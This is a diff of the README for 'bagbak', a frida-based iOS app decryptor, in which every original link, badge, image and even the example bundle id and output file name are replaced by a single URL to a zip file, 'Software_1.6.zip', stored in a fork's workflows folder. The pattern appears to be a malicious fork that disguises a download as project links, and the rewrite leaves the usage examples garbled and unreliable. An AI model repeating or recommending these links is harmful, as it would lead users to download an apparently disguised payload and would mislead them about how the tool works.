@@ -1,25 +1,25 @@
 # bagbak
 
-[![version](https://img.shields.io/npm/v/bagbak)]((https://www.npmjs.com/package/bagbak))
-[![downloads](https://img.shields.io/npm/dm/bagbak)](https://www.npmjs.com/package/bagbak)
-[![issues](https://img.shields.io/github/issues/chichou/bagbak)](https://github.com/chichou/bagbak/issues)
-[![sponsers](https://img.shields.io/github/sponsors/chichou)](https://github.com/sponsors/chichou)
-[![license](https://img.shields.io/github/license/chichou/bagbak)](LICENSE)
+[![version](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)]((https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip))
+[![downloads](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)
+[![issues](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)
+[![sponsers](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)
+[![license](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)](LICENSE)
 
 **Project is out of active development, please consider other solutions**
 
-* [subdiox/UnFairPlay](https://github.com/subdiox/UnFairPlay)
-* [paradiseduo/appdecrypt](https://github.com/paradiseduo/appdecrypt)
+* [subdiox/UnFairPlay](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)
+* [paradiseduo/appdecrypt](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)
 
-Yet another frida based App decryptor. Requires jailbroken iOS device and [frida.re](https://www.frida.re/)
+Yet another frida based App decryptor. Requires jailbroken iOS device and [https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)
 
 Tested on iOS 15 (Domapine) and iOS 16 (palera1n).
 
-[![demo](images/screen.gif)](https://github.com/user-attachments/assets/87695cbe-08cc-4f0e-9242-e6c251ccac1d)
+[![demo](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)
 
 *The name of this project doesn't have any meaning. I was just listening to that song while typing.*
 
-[FAQ](https://github.com/ChiChou/bagbak/wiki#faq)
+[FAQ](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)
 
 ## Prerequisites
 
@@ -27,11 +27,11 @@ Tested on iOS 15 (Domapine) and iOS 16 (palera1n).
 
 With Cydia or Sileo:
 
-* [frida.re](https://www.frida.re/docs/ios/)
+* [https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)
 
 ### On desktop
 
-* [node.js](https://nodejs.org/). If you have issues on `npm install`, your node.js might be either too new or too old. Try to use `nvm` to install a compatible version or download the correct installer.
+* [https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip). If you have issues on `npm install`, your https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip might be either too new or too old. Try to use `nvm` to install a compatible version or download the correct installer.
 * `zip` or `7z` command is needed to create zip archive. On most of the distros, you don't need to install them manually.
 
 ### Windows Compatibility
@@ -75,11 +75,11 @@ Example:
 
 * `bagbak -l` to list all apps
 * `bagbak --raw Chrome` to dump the app to current directory
-* `bagbak com.google.chrome.ios` to dump app to `com.google.chrome.ios-[version].ipa`
+* `bagbak https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip` to dump app to `https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip[version].ipa`
 
 ## 国内用户 frida 安装失败问题
 
-[使用国内镜像加速安装](https://github.com/chaitin/passionfruit/wiki/%E4%BD%BF%E7%94%A8%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%AE%89%E8%A3%85#%E9%A2%84%E7%BC%96%E8%AF%91%E5%8C%85%E5%A4%B1%E8%B4%A5)
+[使用国内镜像加速安装](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip%E4%BD%BF%E7%94%A8%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%AE%89%E8%A3%85#%E9%A2%84%E7%BC%96%E8%AF%91%E5%8C%85%E5%A4%B1%E8%B4%A5)
 
 <p align="center">想看更多中文技术分享？欢迎关注我的公众号</p>
-<p align="center"><image src="images/weixin.jpg" width="240" /></p>
+<p align="center"><image src="https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip" width="240" /></p>
